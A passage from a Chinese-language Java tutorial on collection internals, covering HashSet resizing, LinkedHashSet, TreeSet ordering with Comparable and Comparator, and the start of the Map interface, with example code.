16*加载因子（loadFactor）是0.75 &#x3D; 12</li><li>如果table数组使用到了临界值12，就会扩容到 16*2 &#x3D; 32，新的临界值就是 32*0.75 &#x3D; 24，依次类推</li><li>在Java8中，如果一条链表的元素个数到 TREEIFY_THRESHOLD（默认是8），并且table的大小 &gt;&#x3D; MIN_TREEIFY_CAPACITY（默认64），就会进行树化（红黑树），否则仍然采用数组扩容机制</li></ol><p>注意：<br>​ 每添加一个元素（包括在table表，与表中链表）即添加一个节点，会执行一次 ++size，当size &gt; threshold 时就会执行扩容。<br>​ table表扩容并不是表的16个大小被添加完才执行，当所有元素的个数大于临界值时就会执行扩容。</p><h3 id="HashSet-最佳实现"><a href="#HashSet-最佳实现" class="headerlink" title="HashSet 最佳实现"></a>HashSet 最佳实现</h3><p>定义一个Eeployee类，该类包括：private成员属性name,age</p><p>创建3个Employee对象放入 HashSet中<br>当 name和age的值相同时，认为是相同员工，不能添加到HashSet集合中<br>重写 hashCode()与equals()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Objects;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 定义一个Eeployee类，该类包括：private成员属性name,age</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 1. 创建3个Employee对象放入 HashSet中</span></span><br><span class="line"><span class="comment"> * 2. 当 name和age的值相同时，认为是相同员工，不能添加到HashSet集合中</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HashSetExercise</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        hashSet.add(<span class="keyword">new</span> <span class="title class_">Employee</span>(<span class="string">&quot;ll&quot;</span>,<span class="number">18</span>));</span><br><span class="line">        hashSet.add(<span class="keyword">new</span> <span class="title class_">Employee</span>(<span class="string">&quot;kk&quot;</span>,<span class="number">20</span>));</span><br><span class="line">        hashSet.add(<span class="keyword">new</span> <span class="title class_">Employee</span>(<span class="string">&quot;ll&quot;</span>,<span class="number">18</span>));</span><br><span class="line">        System.out.println(hashSet);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 创建对象</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Employee</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Employee</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    如果 name和age的值相同，则返回相同的hash值</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span> == o) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="literal">null</span> || getClass() != o.getClass()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Employee</span> <span class="variable">employee</span> <span class="operator">=</span> (Employee) o;</span><br><span class="line">        <span class="keyword">return</span> age == employee.age &amp;&amp; Objects.equals(name, employee.name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Objects.hash(name, age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Employee&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LinkedHashSet"><a href="#LinkedHashSet" class="headerlink" title="LinkedHashSet"></a>LinkedHashSet</h2><h3 id="LinkedHashSet-基本介绍"><a href="#LinkedHashSet-基本介绍" class="headerlink" title="LinkedHashSet 基本介绍"></a>LinkedHashSet 基本介绍</h3><ol><li>LinkedHashSet 是 HashSet的子类</li><li>LinkedHashSet 底层是一个LinkedHashMap，底层维护了一个 数组 + 双向链表</li><li>LinkedHashSet 根据元素的 hashCode 值来决定元素的存储位置，同时使用链表维护元素的次序，这使得元素看起来是以插入顺序保存得。</li><li>LinkedHashSet 不允许添加重复元素</li></ol><p>注意：</p><ol><li>在LinkedHashSet中维护了一个hash表和双向链表（LinkedHashSet 有 head和tail）</li><li>每一个节点有 before和after属性，这样可以形成双向链表</li><li>在添加一个元素时，先求hash值，在求索引，确定该元素在table的位置，然后将添加的元素加入到双向链表（如果已经存在，不添加【原则和hashset一样】）</li><li>这样遍历LinkedHashSet 也能确保插入顺序和遍历顺序一致<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LinkedHashSetSource</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">LinkedHashSet</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>();</span><br><span class="line">        set.add(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;AA&quot;</span>));</span><br><span class="line">        set.add(<span class="number">456</span>);</span><br><span class="line">        set.add(<span class="number">456</span>);</span><br><span class="line">        set.add(<span class="keyword">new</span> <span class="title class_">Customer</span>(<span class="string">&quot;刘&quot;</span>,<span class="number">1001</span>));</span><br><span class="line">        set.add(<span class="number">123</span>);</span><br><span class="line">        set.add(<span class="string">&quot;wkliu&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;set&quot;</span>+set);</span><br><span class="line"><span class="comment">//        LinkedHashSet 加入顺序和取出顺序一致</span></span><br><span class="line"><span class="comment">//        LinkedHashSet 底层维护得是一个LinkedHashMap(是HashMap的子类）</span></span><br><span class="line"><span class="comment">//        LinkedHashSet 底层结构 （数组 + 双向链表）</span></span><br><span class="line"><span class="comment">//        添加第一次时，直接将 table 扩容到 16，存放的结点类型是 LinkedHashMap$Entry</span></span><br><span class="line"><span class="comment">//        数组是 HashMap$Node[]   存放的元素/数据是 LinkedHashMap$Entry类型</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">           继承关系在内部类中完成</span></span><br><span class="line"><span class="comment">          static class Entry&lt;K,V&gt; extends HashMap.Node&lt;K,V&gt; &#123;</span></span><br><span class="line"><span class="comment">                 Entry&lt;K,V&gt; before, after;</span></span><br><span class="line"><span class="comment">                 Entry(int hash, K key, V value, Node&lt;K,V&gt; next) &#123;</span></span><br><span class="line"><span class="comment">                      super(hash, key, value, next);</span></span><br><span class="line"><span class="comment">                 &#125;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Customer</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> no;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Customer</span><span class="params">(String name, <span class="type">int</span> no)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.no = no;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Customer&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, no=&quot;</span> + no +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="TreeSet"><a href="#TreeSet" class="headerlink" title="TreeSet"></a>TreeSet</h2><p>不允许添加重复元素，不允许添加 null<br>无序（没有按照输入顺序进行输出）<br>遍历结果有顺序<br>底层为二叉树，且采用中序遍历得到结果 （左节点，根节点，右节点）</p><p>TreeSet的去重机制:如果传入了一个Comparator匿名对象，就使用实现的compareTo去重，如果方法返回0,就认为是相同的元素&#x2F;数据，就不添加，如果没有传入一个Comparator匿名对象，则以你添加的对象实现的Compareable接口的compareTo去重</p><p><strong>添加Integer类型数据</strong><br>元素有序（（Interger)按照升序进行排序）<br>底层利用内部比较器排序<br>底层：二叉树<br>遍历时采用中序遍历（左节点，根节点，右节点）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TreeSet_Integer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        TreeSet&lt;Integer&gt; treesetInt = <span class="keyword">new</span> <span class="title class_">TreeSet</span>&lt;&gt;();</span><br><span class="line">        treesetInt.add(<span class="number">12</span>);</span><br><span class="line">        treesetInt.add(<span class="number">3</span>);</span><br><span class="line">        treesetInt.add(<span class="number">7</span>);</span><br><span class="line">        treesetInt.add(<span class="number">9</span>);</span><br><span class="line">        treesetInt.add(<span class="number">3</span>);</span><br><span class="line">        System.out.println(treesetInt.size());</span><br><span class="line">        System.out.println(treesetInt);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>添加String 类型数据</strong><br>底层实现内部比较器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TreeSet_</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        1. 当使用无参构造器，创建TreeSet时，是自然排序 如a~z</span></span><br><span class="line"><span class="comment">//        2. 使用TreeSet提供的构造器，可以传入一个比较器（匿名内部类）</span></span><br><span class="line"><span class="comment">//              并指定排序规则</span></span><br><span class="line"></span><br><span class="line">        TreeSet&lt;String&gt; treeSet = <span class="keyword">new</span> <span class="title class_">TreeSet</span>();</span><br><span class="line">        treeSet.add(<span class="string">&quot;jack&quot;</span>);</span><br><span class="line">        treeSet.add(<span class="string">&quot;tom&quot;</span>);</span><br><span class="line">        treeSet.add(<span class="string">&quot;10&quot;</span>);</span><br><span class="line">        treeSet.add(<span class="string">&quot;sp&quot;</span>);</span><br><span class="line">        treeSet.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        treeSet.add(<span class="string">&quot;5&quot;</span>);</span><br><span class="line">        treeSet.add(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="comment">//treeSet.add(null);  报NullPointerException</span></span><br><span class="line"></span><br><span class="line">        System.out.println(treeSet);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p><strong>添加自定义类型数据</strong><br>创建student类，实现内部比较器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.TreeSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TreeSet_Student</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        TreeSet&lt;Student&gt;  ts = <span class="keyword">new</span> <span class="title class_">TreeSet</span>&lt;&gt;();</span><br><span class="line">        ts.add(<span class="keyword">new</span> <span class="title class_">Student</span>(<span class="number">10</span>,<span class="string">&quot;alili&quot;</span>));</span><br><span class="line">        ts.add(<span class="keyword">new</span> <span class="title class_">Student</span>(<span class="number">8</span>,<span class="string">&quot;blili&quot;</span>));</span><br><span class="line">        ts.add(<span class="keyword">new</span> <span class="title class_">Student</span>(<span class="number">9</span>,<span class="string">&quot;clili&quot;</span>));</span><br><span class="line">        ts.add(<span class="keyword">new</span> <span class="title class_">Student</span>(<span class="number">3</span>,<span class="string">&quot;blili&quot;</span>));</span><br><span class="line">        ts.add(<span class="keyword">new</span> <span class="title class_">Student</span>(<span class="number">7</span>,<span class="string">&quot;blili&quot;</span>));</span><br><span class="line">        ts.add(<span class="keyword">new</span> <span class="title class_">Student</span>(<span class="number">1</span>,<span class="string">&quot;clili&quot;</span>));</span><br><span class="line">        ts.add(<span class="keyword">new</span> <span class="title class_">Student</span>(<span class="number">3</span>,<span class="string">&quot;elili&quot;</span>));</span><br><span class="line"></span><br><span class="line">        System.out.println(ts.size());</span><br><span class="line">        System.out.println(ts);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">implements</span> <span class="title class_">Comparable</span>&lt;Student&gt;&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(<span class="type">int</span> age, String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Student&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compareTo</span><span class="params">(Student o)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getAge() - o.getAge();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用外部比较器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TreeSet_</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        1. 当使用无参构造器，创建TreeSet时，是自然排序 如a~z</span></span><br><span class="line"><span class="comment">//        2. 使用TreeSet提供的构造器，可以传入一个比较器（匿名内部类）</span></span><br><span class="line"><span class="comment">//              并指定排序规则</span></span><br><span class="line"></span><br><span class="line">        TreeSet&lt;String&gt; treeSet = <span class="keyword">new</span> <span class="title class_">TreeSet</span>();</span><br><span class="line">        treeSet.add(<span class="string">&quot;jack&quot;</span>);</span><br><span class="line">        treeSet.add(<span class="string">&quot;tom&quot;</span>);</span><br><span class="line">        treeSet.add(<span class="string">&quot;10&quot;</span>);</span><br><span class="line">        treeSet.add(<span class="string">&quot;sp&quot;</span>);</span><br><span class="line">        treeSet.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        treeSet.add(<span class="string">&quot;5&quot;</span>);</span><br><span class="line">        treeSet.add(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="comment">//treeSet.add(null);  报NullPointerException</span></span><br><span class="line"></span><br><span class="line">        System.out.println(treeSet);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">TreeSet</span> <span class="variable">treeSet2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeSet</span>(<span class="keyword">new</span> <span class="title class_">Comparator</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Object o1, Object o2)</span> &#123;</span><br><span class="line"><span class="comment">//                调用 String 的 compareTo()方法进行字符串大小比较</span></span><br><span class="line">                <span class="keyword">return</span> ((String) o1).compareTo((String) o2);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        treeSet2.add(<span class="string">&quot;jack&quot;</span>);</span><br><span class="line">        treeSet2.add(<span class="string">&quot;tom&quot;</span>);</span><br><span class="line">        treeSet2.add(<span class="string">&quot;10&quot;</span>);</span><br><span class="line">        treeSet2.add(<span class="string">&quot;sp&quot;</span>);</span><br><span class="line">        treeSet2.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        treeSet2.add(<span class="string">&quot;5&quot;</span>);</span><br><span class="line">        treeSet2.add(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        System.out.println(treeSet2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p>底层为 TreeMap</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> NavigableMap&lt;E,Object&gt; m;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 空构造器，底层创建 TreeMap </span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">TreeSet</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(<span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;E,Object&gt;());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this 构造器</span></span><br><span class="line">TreeSet(NavigableMap&lt;E,Object&gt; m) &#123;</span><br><span class="line">        <span class="built_in">this</span>.m = m;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> m.put(e, PRESENT)==<span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="Map接口和常用方法"><a href="#Map接口和常用方法" class="headerlink" title="Map接口和常用方法"></a>Map接口和常用方法</h2><h3 id="Map-接口实现类的特点"><a href="#Map-接口实现类的特点" class="headerlink" title="Map 接口实现类的特点"></a>Map 接口实现类的特点</h3><ol><li>Map和Collection并列存在。用于保存具有映射关系的数据：key-value</li><li>Map中的 key 和 value 可以是任何引用类型的数据，会封装到 HashMap$Node对象中</li><li>Map 中的 Key 不允许重复，原因和HashSet 一样</li><li>Map 中的 value 可以重复</li><li>Map 的key 可以为 null，value 也可以为null，注意 key 为null，只能有一个，</li><li>常用String类作为Map 的key</li><li>key 和 value 之间存在单向一对一关系，即通过指定的 key 总能找到对应的 value</li><li>Map存放数据的 key-value ，一对 k-v 是放在一个Node中的，又因为Node实现了 Entry接口，所以封装为entry。为了方便管理，将enrty放入到一个entryset集合中</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Map_</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        map接口实现类特点</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 